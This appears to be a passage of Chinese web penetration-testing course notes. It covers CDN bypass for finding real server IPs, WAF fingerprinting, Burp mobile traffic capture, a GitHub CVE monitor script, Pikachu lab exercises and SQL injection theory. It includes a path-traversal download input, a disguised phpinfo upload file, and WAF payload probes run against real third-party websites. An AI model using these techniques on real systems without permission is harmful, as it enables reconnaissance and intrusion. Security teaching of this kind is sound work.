+<h3 id="2、CDN对于安全测试有那些影响"><a href="#2、CDN对于安全测试有那些影响" class="headerlink" title="2、CDN对于安全测试有那些影响?"></a>2、CDN对于安全测试有那些影响?</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cdn会隐藏服务器真实的ip地址，无法对目标网站的操作系统进行渗透，但cdn站点又可以理解为是目标站点的镜像站点（大多数都是静态cdn加速），拥有相同的网站架构，且cdn服务器可与站点服务器进行交互，因此sql注入，xss等漏洞的挖掘并不受太大影响。</span><br></pre></td></tr></table></figure>
+
+<h3 id="3、目前常见的CDN绕过技术有哪些"><a href="#3、目前常见的CDN绕过技术有哪些" class="headerlink" title="3、目前常见的CDN绕过技术有哪些?"></a>3、目前常见的CDN绕过技术有哪些?</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">子域名查询：</span><br><span class="line">					因为有些主站是做了CDN服务而子站是没有做CDN服务</span><br><span class="line">邮件服务查询</span><br><span class="line">					因为邮箱大部分都是内部人在访问、而且访问的量也不是很大，一般是没有做CDN。</span><br><span class="line">国外地址请求</span><br><span class="line">					因为很多的企业没有在国外部署CDN，要是用国外的地址请求、就容易找到他的真实地址。</span><br><span class="line">遗留文件、扫描全网</span><br><span class="line">					如PHPinfo信息当中会遗留出ip地址</span><br><span class="line">黑暗引擎搜索</span><br><span class="line">					fofa、傻蛋、谛听、zoomeye、censys</span><br><span class="line">特定文件dns历史记录，以量打量</span><br><span class="line"></span><br><span class="line"><span class="comment">#CDN真实IP地址获取后绑定指向地址</span></span><br><span class="line">更改本地HOSTS解析指向文件</span><br><span class="line"></span><br><span class="line">奇淫技巧</span><br><span class="line">	fackcdn w8fuckcdn	zmap</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Day8-信息收集-waf"><a href="#Day8-信息收集-waf" class="headerlink" title="Day8 信息收集-waf"></a>Day8 <strong>信息收集-waf</strong></h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623307390451-79e7a71e-656c-4401-ae03-c817b38967cc.png?x-oss-process=image/format,webp/resize,w_1022,limit_0" alt="信息收集.png" loading="lazy"></p>
+<h3 id="WAF防护分析"><a href="#WAF防护分析" class="headerlink" title="WAF防护分析"></a>WAF防护分析</h3><h4 id="1、什么是WAF应用"><a href="#1、什么是WAF应用" class="headerlink" title="1、什么是WAF应用?"></a>1、什么是WAF应用?</h4><p>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。</p>
+<h4 id="2、如何快速识别WAF"><a href="#2、如何快速识别WAF" class="headerlink" title="2、如何快速识别WAF?"></a>2、如何快速识别WAF?</h4><p>1、采用工具wafwoof</p>
+<p>获取地址：<a href="https://codeload.github.com/EnableSecurity/wafw00f/zip/refs/heads/master">https://codeload.github.com/EnableSecurity/wafw00f/zip/refs/heads/master</a></p>
+<p>安装之前一定要有python的环境不然安装不上</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># unzip wafw00f-master.zip</span><br><span class="line"># python3.8 setup.py install</span><br><span class="line"># ls -ld wafw00f</span><br><span class="line">drwxr-xr-x 6 root root 4096  6月 10 17:22 wafw00f</span><br><span class="line"># cd wafw00f </span><br><span class="line">#python main.py https://www.hlszsb.com/</span><br><span class="line"></span><br><span class="line">[*] Checking https://www.hlszsb.com/</span><br><span class="line">[+] Generic Detection results:</span><br><span class="line">[-] No WAF detected by the generic detection</span><br><span class="line">[~] Number of requests: 7</span><br></pre></td></tr></table></figure>
+
+<p>wafw00f的缺点判断的不是特别的准确存在误报或识别不出的情况。</p>
+<p>2、在有些网站的请求信息当中有的网站没有做安全信息上面留下了waf的相关信息</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623321097508-bb59f182-b4cd-4fc3-9754-16552c7f8523.png?x-oss-process=image/format,webp" alt="image.png" loading="lazy"></p>
+<p>3、使用nmap指纹检测</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --script==http-waf-fingerprint</span><br><span class="line"></span><br><span class="line">nmap --script=http-waf-detec</span><br></pre></td></tr></table></figure>
+
+<p>4、identYwaf </p>
+<p>参考地址：<a href="https://github.com/stamparm/identywaf">https://github.com/stamparm/identywaf</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\admin\Desktop\security\软件\identYwaf-master&gt;python identYwaf.py https://www.manjaro.cn/</span><br><span class="line">                                    __ __</span><br><span class="line"> ____  ___      ___  ____   ______ |  T  T __    __   ____  _____</span><br><span class="line">l    j|   \    /  _]|    \ |      T|  |  ||  T__T  T /    T|   __|</span><br><span class="line"> |  T |    \  /  [_ |  _  Yl_j  l_j|  ~  ||  |  |  |Y  o  ||  l_</span><br><span class="line"> |  | |  D  YY    _]|  |  |  |  |  |___  ||  |  |  ||     ||   _|</span><br><span class="line"> j  l |     ||   [_ |  |  |  |  |  |     ! \      / |  |  ||  ]</span><br><span class="line">|____jl_____jl_____jl__j__j  l__j  l____/   \_/\_/  l__j__jl__j  (1.0.134)</span><br><span class="line"></span><br><span class="line">[o] initializing handlers...</span><br><span class="line">[i] checking hostname &#x27;www.manjaro.cn&#x27;...</span><br><span class="line">[i] running basic heuristic test...</span><br><span class="line">[i] rejected summary: 200 (&#x27;&lt;title&gt;����ҳ��&lt;/title&gt;&#x27;)</span><br><span class="line">[-] non-blind match: -</span><br><span class="line">[i] running payload tests... (45/45)</span><br><span class="line">[=] results: &#x27;.xx.xxxxx..xxxxxxxx.xxx.x...x.xxx......x..xxx&#x27;</span><br><span class="line">[=] hardness: hard (60%)</span><br><span class="line">[=] blocked categories: SQLi, XSS, XPATHi, XXE, PHPi, PT</span><br><span class="line">[=] signature: &#x27;90fa:RVZXu261OEhCWapBYKcPk4JzWOpohM4JiUcMr2RXg1uQJbX3uhdOnthtOj+hX7AA16FcPhJOdLoXo2tKaK99n+i7c4RmkgI2FZjxtDtAeq+c3qA4chW1XaTD&#x27;</span><br><span class="line">[+] blind match: &#x27;Safedog&#x27; (100%)</span><br></pre></td></tr></table></figure>
+
+<h4 id="3、识别wAF对于安全测试的意义"><a href="#3、识别wAF对于安全测试的意义" class="headerlink" title="3、识别wAF对于安全测试的意义?"></a>3、识别wAF对于安全测试的意义?</h4><p>对于一个网站要是使用了waf而渗透人员没有识别直接使用工具进行扫描有可能会导致waf将你的ip地址拉入黑名单而不能访问。而识别waf在于有针对性行的绕过各个厂商的waf可能存在着不同的绕过思路。</p>
+<h2 id="Day9-APP信息收集"><a href="#Day9-APP信息收集" class="headerlink" title="Day9 APP信息收集"></a>Day9 APP信息收集</h2><h3 id="一、bp抓取手机数据包"><a href="#一、bp抓取手机数据包" class="headerlink" title="一、bp抓取手机数据包"></a>一、bp抓取手机数据包</h3><p>手机IP地址：192.168.1.3</p>
+<p>kali：192.168.1.9</p>
+<p>burp配置</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623418667628-da931a3a-408e-4ce7-b9ea-c65e54188390.png?x-oss-process=image/format,webp" alt="image.png" loading="lazy"></p>
+<p>手机配置</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623419674947-c5a9c6ff-9b1e-427e-b37e-59b86a196aed.png" alt="img" loading="lazy"></p>
+<p>抓包测试</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623418954634-f32f5537-fba4-48a9-85d7-46a9d2d9bf19.png" alt="img" loading="lazy"></p>
+<p>配置证书</p>
+<p>在浏览器中输入192.168.1.9:8888下载证书并重名为ca.cer 然后导入</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623419652286-58cce6cf-d461-4de3-856b-924818c69562.png" alt="img" loading="lazy"></p>
+<p>导入证书：设置-密码与安全-系统安全-加密与凭证-从sd卡安装-然后搜索ca.cer</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623419618483-57f88fc3-b83c-4a47-95ae-80828f3e1238.png" alt="img" loading="lazy"></p>
+<p>抓包测试</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623419740073-68dc5d2a-5d72-4667-aadb-ad6007153c75.png" alt="img" loading="lazy"></p>
+<h3 id="二、对抓取的数据包进行分析"><a href="#二、对抓取的数据包进行分析" class="headerlink" title="二、对抓取的数据包进行分析"></a>二、对抓取的数据包进行分析</h3><p>通过对抓取到的数据包进行分析、数据包上面可能有域名有ip地址。对上面的数据包进行信息收集、借助shodan、钟馗之眼、fofa等工具进行端口扫描</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623571180297-c66aa710-bd70-48c1-a079-12e0b4de60fa.png" alt="img" loading="lazy"><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623571217679-1525c491-396c-422c-bc58-54e93c5008ca.png" alt="img" loading="lazy"><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623571237218-018e9779-08f7-4ef1-a534-d19e7cbece34.png" alt="img" loading="lazy"></p>
+<h2 id="Day10-资产收集"><a href="#Day10-资产收集" class="headerlink" title="Day10 资产收集"></a>Day10 资产收集</h2><h3 id="一、GitHub项目监控"><a href="#一、GitHub项目监控" class="headerlink" title="一、GitHub项目监控"></a>一、GitHub项目监控</h3><p>server酱：<a href="http://sc.ftqq.com/3.version">http://sc.ftqq.com/3.version</a></p>
+<p>GitHub项目监控地址：<a href="https://github.com/weixiao9188/wechat_push">https://github.com/weixiao9188/wechat_push</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Title: wechat push CVE-2020</span><br><span class="line"># Date: 2020-5-9</span><br><span class="line"># Exploit Author: weixiao9188</span><br><span class="line"># Version: 4.0</span><br><span class="line"># Tested on: Linux,windows</span><br><span class="line"># coding:UTF-8</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line">import os</span><br><span class="line">import pandas as pd</span><br><span class="line">time_sleep = 20 #每隔20秒爬取一次</span><br><span class="line">while(True):</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3741.400 QQBrowser/10.5.3863.400&quot;&#125;</span><br><span class="line">    #判断文件是否存在</span><br><span class="line">    datas = []</span><br><span class="line">    response1=None</span><br><span class="line">    response2=None</span><br><span class="line">    if os.path.exists(&quot;olddata.csv&quot;):</span><br><span class="line">        #如果文件存在则每次爬取10个</span><br><span class="line">        df = pd.read_csv(&quot;olddata.csv&quot;, header=None)</span><br><span class="line">        datas = df.where(df.notnull(),None).values.tolist()#将提取出来的数据中的nan转化为None</span><br><span class="line">        response1 = requests.get(url=&quot;https://api.github.com/search/repositories?q=CVE-2020&amp;sort=updated&amp;per_page=10&quot;,</span><br><span class="line">                                 headers=headers)</span><br><span class="line">        response2 = requests.get(url=&quot;https://api.github.com/search/repositories?q=RCE&amp;ssort=updated&amp;per_page=10&quot;,</span><br><span class="line">                                 headers=headers)</span><br><span class="line"></span><br><span class="line">    else:</span><br><span class="line">        #不存在爬取全部</span><br><span class="line">        datas = []</span><br><span class="line">        response1 = requests.get(url=&quot;https://api.github.com/search/repositories?q=CVE-2020&amp;sort=updated&amp;order=desc&quot;,headers=headers)</span><br><span class="line">        response2 = requests.get(url=&quot;https://api.github.com/search/repositories?q=RCE&amp;ssort=updated&amp;order=desc&quot;,headers=headers)</span><br><span class="line"></span><br><span class="line">    data1 = json.loads(response1.text)</span><br><span class="line">    data2 = json.loads(response2.text)</span><br><span class="line">    for j in [data1[&quot;items&quot;],data2[&quot;items&quot;]]:</span><br><span class="line">        for i in j:</span><br><span class="line">            s = &#123;&quot;name&quot;:i[&#x27;name&#x27;],&quot;html&quot;:i[&#x27;html_url&#x27;],&quot;description&quot;:i[&#x27;description&#x27;]&#125;</span><br><span class="line">            s1 =[i[&#x27;name&#x27;],i[&#x27;html_url&#x27;],i[&#x27;description&#x27;]]</span><br><span class="line">            if s1 not in datas:</span><br><span class="line">                #print(s1)</span><br><span class="line">                #print(datas)</span><br><span class="line">                params = &#123;</span><br><span class="line">                     &quot;text&quot;:s[&quot;name&quot;],</span><br><span class="line">                    &quot;desp&quot;:&quot; 链接:&quot;+str(s[&quot;html&quot;])+&quot;\n简介&quot;+str(s[&quot;description&quot;])</span><br><span class="line">                &#125;</span><br><span class="line">                print(&quot;当前推送为&quot;+str(s)+&quot;\n&quot;)</span><br><span class="line">                print(params)</span><br><span class="line">                requests.get(&quot;https://sc.ftqq.com/XXXX.send&quot;,params=params,timeout=10)</span><br><span class="line">                #time.sleep(1)#以防推送太猛</span><br><span class="line">                print(&quot;推送完成!&quot;)</span><br><span class="line">                datas.append(s1)</span><br><span class="line">            else:</span><br><span class="line">                pass</span><br><span class="line">                #print(&quot;数据已处在!&quot;)</span><br><span class="line">    pd.DataFrame(datas).to_csv(&quot;olddata.csv&quot;,header=None,index=None)</span><br><span class="line">    time.sleep(time_sleep)</span><br></pre></td></tr></table></figure>
+
+<h3 id="常见的子域名收集方法"><a href="#常见的子域名收集方法" class="headerlink" title="常见的子域名收集方法"></a>常见的子域名收集方法</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623572333231-e96bd343-8744-4813-97f1-b8de7edc3eb7.png" alt="img" loading="lazy"></p>
+<h3 id="二、黑暗引擎使用"><a href="#二、黑暗引擎使用" class="headerlink" title="二、黑暗引擎使用"></a>二、黑暗引擎使用</h3><p>fofa:<a href="https://fofa.so/">https://fofa.so/</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623589748216-0c897162-4562-4640-ac23-dc5b858a2877.png" alt="img" loading="lazy"></p>
+<p>zoomeye:<a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623589854664-03ef0c81-6e7a-4bbc-8936-5df1f751682c.png" alt="img" loading="lazy"></p>
+<h2 id="Day11-Web-漏洞"><a href="#Day11-Web-漏洞" class="headerlink" title="Day11 Web 漏洞"></a>Day11 Web 漏洞</h2><p>前言:本章节将讲解各种WEB层面上的有那些漏洞类型,俱体漏洞的危害等级，以简要的影响范围测试进行实例分析，思维导图中的漏洞也是后面我们将要学习到的各个知识点，其中针对漏洞的形成原理，如何发现，如何利用将是本章节学习的重点内容!</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623721425978-e14463d7-40a4-4686-99e5-3ac03dfe8c33.png?x-oss-process=image/format,webp" alt="web-漏洞小迪安全.png" loading="lazy"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CTE,SRc，红蓝对抗，实战等</span><br><span class="line"></span><br><span class="line">#简要说明以上漏洞危害情况</span><br><span class="line">#简要说明以上漏洞等级划分</span><br><span class="line">#简要说明以上漏洞重点内容</span><br><span class="line">#简要说明以上漏洞形势问题</span><br></pre></td></tr></table></figure>
+
+<h3 id="一、pikachu环境搭建"><a href="#一、pikachu环境搭建" class="headerlink" title="一、pikachu环境搭建"></a>一、pikachu环境搭建</h3><p>**靶场搭建：**<a href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a></p>
+<p><strong>docker环境</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@oldjiang ~]# docker pull area39/pikachu</span><br><span class="line">[root@oldjiang ~]# docker run -d -p8080:80 area39/pikachu</span><br><span class="line">72ddd9a05d31fdb921765519c413f3f97dbb34560c9c14d9aa59de73e5d6b3eb</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623725817931-b6ba0eae-866c-4410-ba2b-0e09edaa7483.png" alt="img" loading="lazy"><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623725840715-17108d47-0daf-4cf9-a4d9-a4b06c01e1e0.png" alt="img" loading="lazy"><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623725858994-fab78038-e51a-439c-98c5-c27fb0bdc951.png" alt="img" loading="lazy"></p>
+<h3 id="二、sql注入之数字注入"><a href="#二、sql注入之数字注入" class="headerlink" title="二、sql注入之数字注入"></a>二、sql注入之数字注入</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623726082542-3c0ab2c3-ac9d-47d9-aeb7-5eb283e338d4.png" alt="img" loading="lazy"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623726168437-2aea63ff-47d4-4bb6-b842-2eddfc326037.png" alt="img" loading="lazy"></p>
+<p>在数据库中查看信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from member;</span><br><span class="line">+----+----------+----------------------------------+------+-------------+-----------------------+-------------------+</span><br><span class="line">| id | username | pw                               | sex  | phonenum    | address               | email             |</span><br><span class="line">+----+----------+----------------------------------+------+-------------+-----------------------+-------------------+</span><br><span class="line">|  1 | vince    | e10adc3949ba59abbe56e057f20f883e | boy  | 18626545453 | chain                 | vince@pikachu.com |</span><br><span class="line">|  2 | allen    | e10adc3949ba59abbe56e057f20f883e | boy  | 13676767767 | nba 76                | allen@pikachu.com |</span><br><span class="line">|  3 | kobe     | e10adc3949ba59abbe56e057f20f883e | boy  | 15988767673 | nba lakes             | kobe@pikachu.com  |</span><br><span class="line">|  4 | grady    | e10adc3949ba59abbe56e057f20f883e | boy  | 13676765545 | nba hs                | grady@pikachu.com |</span><br><span class="line">|  5 | kevin    | e10adc3949ba59abbe56e057f20f883e | boy  | 13677676754 | Oklahoma City Thunder | kevin@pikachu.com |</span><br><span class="line">|  6 | lucy     | e10adc3949ba59abbe56e057f20f883e | girl | 12345678922 | usa                   | lucy@pikachu.com  |</span><br><span class="line">|  7 | lili     | e10adc3949ba59abbe56e057f20f883e | girl | 18656565545 | usa                   | lili@pikachu.com  |</span><br><span class="line">+----+----------+----------------------------------+------+-------------+-----------------------+-------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>操作方法</strong></p>
+<ul>
+<li>在文件&#x2F;app&#x2F;vul&#x2F;sqli&#x2F;sqli_id.php第27行下面增加一行 echo $query; 然后保存退出</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">27 		$query=&quot;select username,email from member where id=$id&quot;;</span><br><span class="line">28  			echo $query;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623727035392-8bae692b-b5a8-4950-b78b-1b28a69f0307.png" alt="img" loading="lazy"><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623727102875-ef393c8b-04ff-48cc-93d2-c1c85b87bd7d.png" alt="img" loading="lazy"></p>
+<ul>
+<li>打开burp修改数据包</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623727977772-d60e637e-411b-47da-b0e5-1a83f7aad635.png" alt="img" loading="lazy"></p>
+<ul>
+<li>获取到数据库信息</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623727870910-067e4d6b-2a8a-4b38-8eaa-fc5a2de6ea8a.png" alt="img" loading="lazy"></p>
+<h3 id="三、文件遍历漏洞"><a href="#三、文件遍历漏洞" class="headerlink" title="三、文件遍历漏洞"></a>三、文件遍历漏洞</h3><p>创建文件dir.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@eb8d8fc8a3e7:/app# pwd</span><br><span class="line">/app</span><br><span class="line">root@eb8d8fc8a3e7:/app# vim dir.php</span><br><span class="line">root@eb8d8fc8a3e7:/app# pwd</span><br><span class="line">/app</span><br><span class="line">root@eb8d8fc8a3e7:/app# cat dir.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function my_dir($dir) &#123;</span><br><span class="line">        $files = [];</span><br><span class="line">        if(@$handle = opendir($dir)) &#123;</span><br><span class="line">                while(($file = readdir($handle)) !== false) &#123;</span><br><span class="line">                        if($file != &quot;..&quot; &amp;&amp; $file != &quot;.&quot;) &#123;</span><br><span class="line">                                if(is_dir($dir . &quot;/&quot; . $file)) &#123; //如果是子文件夹，进行递归</span><br><span class="line">                                        $files[$file] = my_dir($dir . &quot;/&quot; . $file);</span><br><span class="line">                                &#125; else &#123;</span><br><span class="line">                                        $files[] = $file;</span><br><span class="line">                                &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        closedir($handle);</span><br><span class="line">    &#125;</span><br><span class="line">        return $files;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">print_r(my_dir(&quot;../app&quot;));</span><br><span class="line">echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">root@eb8d8fc8a3e7:/app# chmod +x dir.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623732208906-1be70b3b-2f4f-49ef-9bd0-64603ddb3051.png" alt="img" loading="lazy"></p>
+<p>**备注：**目录遍历漏洞一般由其他的漏洞配合才能实现漏洞的作用。</p>
+<h3 id="四、文件上传漏洞"><a href="#四、文件上传漏洞" class="headerlink" title="四、文件上传漏洞"></a>四、文件上传漏洞</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623738344797-a82edfa6-f1c3-451a-a8ca-6a2607601c5d.png" alt="img" loading="lazy"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/桌面]</span><br><span class="line">└─# cat phpinfo.jpg                                                                                                                                                                     2 ⚙</span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623738441797-8fa3377f-832f-40f9-ad58-ad37e08b925e.png" alt="img" loading="lazy"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623738490937-30de4bcb-4317-4c99-a52d-6dad4fe2fb9f.png" alt="img" loading="lazy"></p>
+<p>**注意：**文件上传一般是高危漏洞，因为要是上传的是木马文件可以直接拿下服务器。</p>
+<h3 id="五、文件下载漏洞"><a href="#五、文件下载漏洞" class="headerlink" title="五、文件下载漏洞"></a>五、文件下载漏洞</h3><p>右击复制下载地址：<a href="http://10.1.1.133:8080/vul/unsafedownload/execdownload.php?filename=kb.png">http://10.1.1.133:8080/vul/unsafedownload/execdownload.php?filename=kb.png</a></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623739441944-aab00923-c2a4-4830-9e35-24fa47e9548d.png" alt="img" loading="lazy"></p>
+<p>在网站目录中查看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@eb8d8fc8a3e7:/app/vul/unsafedownload/download# pwd</span><br><span class="line">/app/vul/unsafedownload/download</span><br><span class="line">root@eb8d8fc8a3e7:/app/vul/unsafedownload/download# ls</span><br><span class="line">ai.png  bigben.png  camby.png  kb.png  lmx.png  mbl.png  ns.png  oldfish.png  pj.png  rayal.png  sks.png  smallane.png</span><br></pre></td></tr></table></figure>
+
+<p>修改下载文件</p>
+<p><a href="http://10.1.1.133:8080/vul/unsafedownload/execdownload.php?filename=../unsafedownload.php">http://10.1.1.133:8080/vul/unsafedownload/execdownload.php?filename=../unsafedownload.php</a></p>
+<h1 id="SQL注入漏洞部分"><a href="#SQL注入漏洞部分" class="headerlink" title="SQL注入漏洞部分"></a>SQL注入漏洞部分</h1><h2 id="Day12-SQL注入"><a href="#Day12-SQL注入" class="headerlink" title="Day12 SQL注入"></a>Day12 SQL注入</h2><p>在本系列课程学习中，SQL注入漏洞将是重点部分，其中SQL注入又非常复杂，区分各种数据库类型，提交方法，数据类型等注入，我们需要按部就班的学习，才能学会相关SQL注入的核心。同样此类漏洞是WEB安全中严重的安全漏洞，学习如何利用，挖掘，修复也是很重要的。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623750701440-910fbead-ad66-48bf-bf97-eb5f58f83565.png?x-oss-process=image/format,webp/resize,w_937,limit_0" alt="SQL注入-小迪安全.png" loading="lazy"></p>
+<h3 id="一、SQL注入原理"><a href="#一、SQL注入原理" class="headerlink" title="一、SQL注入原理"></a>一、SQL注入原理</h3><ul>
+<li><h4 id="1-理解SQL注入"><a href="#1-理解SQL注入" class="headerlink" title="1.理解SQL注入"></a>1.理解SQL注入</h4>​    SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的sql服务器加以解析和执行。由于sql语句本身的多样性，以及可用于构造sql语句的编程方法很多，因此凡是构造sql语句的步骤均存在被攻击的潜在风险。Sql注入的方式主要是直接将代码插入参数中，这些参数会被置入sql命令中加以执行。间接的攻击方式是将恶意代码插入字符串中，之后将这些字符串保存到数据库的数据表中或将其当成元数据。当将存储的字符串置入动态sql命令中时，恶意代码就将被执行。</li>
+</ul>
+<p>​	如果web应用未对动态构造的sql语句使用的参数进行正确性审查（即便使用了参数化技术），攻击者就很可能会修改后台sql语句的构造。如果攻击者能够修改sql语句，那么该语句将与应用的用户具有相同的权限。当使用sql服务器执行与操作系统交互命令时，该进程将与执行命令的组件（如数据库服务器、应用服务器或web服务器）拥有相同的权限，这种权限的级别通常很高。如果攻击者执行以上恶意代码的插入操作成功，那么用户数据库服务器或者整个应用会遭到破坏，甚至被控制。 </p>
+<ul>
+<li><h4 id="2-sql注入的产生过程及常见原因"><a href="#2-sql注入的产生过程及常见原因" class="headerlink" title="2.sql注入的产生过程及常见原因"></a>2.sql注入的产生过程及常见原因</h4></li>
+<li><ul>
+<li><h5 id="2-1产生过程"><a href="#2-1产生过程" class="headerlink" title="2.1产生过程"></a>2.1产生过程</h5>​    大多数的web应用都需要与数据库进行交互，并且大多数web应用编程语言（如ASP、C##、.NET、Java和PHP）均提供了可编程的方法来与数据库连接并进行交互。如果web应用开发人员无法确保在将从web表单，cookie及输入参数等收到的值传递给sql查询（该查询在数据库服务器上执行）之前已经对其进行过验证，那么通常会出现sql注入漏洞，如果攻击者能够控制发送给sql查询的输入，并且能够操纵该输入将其解析为代码而非数据，那么攻击者就很有可能有能力在后台数据库执行该代码。</li>
+</ul>
+</li>
+<li><ul>
+<li><h5 id="2-2常见的sql注入产生原因"><a href="#2-2常见的sql注入产生原因" class="headerlink" title="2.2常见的sql注入产生原因"></a>2.2常见的sql注入产生原因</h5>​    基于此，SQL注入的产生原因通常表现在以下几方面：①转义字符处理不合适；②不安全的数据库配置；③不合理的查询集处理；④不当的错误处理；⑤多个提交处理不当。</li>
+</ul>
+</li>
+<li><ul>
+<li><h5 id="2-2-1不当的处理类型"><a href="#2-2-1不当的处理类型" class="headerlink" title="2.2.1不当的处理类型"></a>2.2.1不当的处理类型</h5>​      Sql数据库将单引号字符（’）解析成代码与数据间的分界线：单引号外面的内容军事需要运行的代码，而用单引号引起来的内容均是数据。因为只需要简单的在URL或WEB页面的字段中输入一个单引号，就能很快速的识别出web站点是否会受到sql注入攻击。</li>
+</ul>
+</li>
+<li><ul>
+<li><h5 id="2-2-2不安全的数据库配置"><a href="#2-2-2不安全的数据库配置" class="headerlink" title="2.2.2不安全的数据库配置"></a>2.2.2不安全的数据库配置</h5><p>​      数据库带有很多默认的用户预安装内容。SQL Server使用声名狼藉的“sa”作为数据库系统管理员账户，MySQL使用“root”和“anonymous”用户账户，Oracle则在创建数据库时通常会创建SYS、SYSTEM、DBSNMP和OUTLN账户。这些并非是全部的账号，知识比较出名的账户中的一部分，还有很多其他的账户。其他账户同样按默认方式进行预设，口令总所周知。</p>
+</li>
+<li><p>   这就带来了很大的安全风险，攻击者利用sql注入漏洞时，通常会常识访问数据库的元数据，比如内部的数据库和表的名称、列的数据类型和访问权限，例如MySQL服务器的元数据位于information_schema虚拟数据库中，可通过show databases；和show tables；命令访问。所有的MySQL用户均有权限访问该数据库中的表，但只能查看表中那些与该用户访问权限相对应的对象的行。</p>
+</li>
+</ul>
+</li>
+<li><ul>
+<li><h5 id="2-2-3不合理的查询集处理"><a href="#2-2-3不合理的查询集处理" class="headerlink" title="2.2.3不合理的查询集处理"></a>2.2.3不合理的查询集处理</h5>​        有时需要使用动态的sql语句对某些复杂的应用进行编码，因为程序开发阶段可能还不知道要查询的表或字段（或者不存在）。比如与大型数据库交互的应用，这些数据库在定期创建的表中的数据由于应用已经产生了输入，因而开发人员会信任该数据，攻击者可以使用自己的表和字段数据来替换应用产生的值，从而影响系统的返回值。</li>
+</ul>
+</li>
+<li><ul>
+<li><h5 id="2-2-4不当的错误处理"><a href="#2-2-4不当的错误处理" class="headerlink" title="2.2.4不当的错误处理"></a>2.2.4不当的错误处理</h5>​    错误处理不当会为web站点带来很多安全方面的问题。最常见的问题是将详细的内部错误消息（如错误代码，数据库转存储）显示给用户或攻击。这些错误消息会泄露实现细节，为攻击者提供与网站潜在缺陷相关的重要线索。</li>
+</ul>
+</li>
+<li><ul>
+<li><h5 id="2-2-5多个提交处理不当"><a href="#2-2-5多个提交处理不当" class="headerlink" title="2.2.5多个提交处理不当"></a>2.2.5多个提交处理不当</h5></li>
+</ul>
+</li>
+</ul>
